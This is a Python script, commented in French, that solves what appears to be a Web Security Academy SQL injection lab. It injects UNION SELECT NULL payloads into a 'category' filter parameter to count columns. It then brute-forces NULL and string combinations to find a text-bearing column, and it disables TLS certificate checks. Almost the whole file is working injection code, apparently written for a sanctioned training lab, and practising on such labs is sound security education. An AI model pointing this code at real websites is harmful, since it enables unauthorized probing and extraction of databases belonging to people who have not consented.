import requests
import urllib3
from bs4 import BeautifulSoup
import itertools
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


#recuprer le string
def recup_string(url):
    str_url=url
    try:
        recup_str=requests.get(str_url,verify=False)
        soup=BeautifulSoup(recup_str.text,'html.parser')
        soup_srt=soup.find('p',id='hint').text[-7:-1]
        return str(soup_srt)
    except Exception as mon_exception:
        print(f"Erreur lors de la recuperation du String : {mon_exception}")


#recuperer le nombre de colonne
def get_nb_column(url):
    exploit_url=url+"/filter?category=Pets'"
    i=False
    nb_column=1
    m_null="NULL,"
    while i==False:
        payload="union select "+m_null+"--"
        final_payload=payload[:-3]+payload[-2:]
        final_exploit_url=exploit_url+final_payload
        reponse=requests.get(final_exploit_url,verify=False)        
        if "Internal Server Error" in reponse.text:
            i=False
            nb_column+=1
            m_null=m_null+"NULL,"
        else :
            i=True
            return nb_column
 
 
#lancer l'exploit         
def lancer_exploit(url):
    exploit_url=url+"/filter?category=Pets"
    m_null="NULL"
    m_string="'"+recup_string(url)+"'"
    payload_possible=[m_null,m_string]
    taille_tableau=get_nb_column(url)
    
    all_payload=itertools.product(payload_possible,repeat=taille_tableau)
    
    for payload in all_payload:
        final_url=exploit_url+"' union select "+','.join(map(str,payload))+"--"
        print(final_url)
        reponse=requests.get(final_url,verify=False)
        if "Congratulations" in reponse.text:
            print("Congratulations, you solved the lab!")
            break
        
                
test=(lancer_exploit("https://0aa8009f04a7f87f815893db00ee00ca.web-security-academy.net"))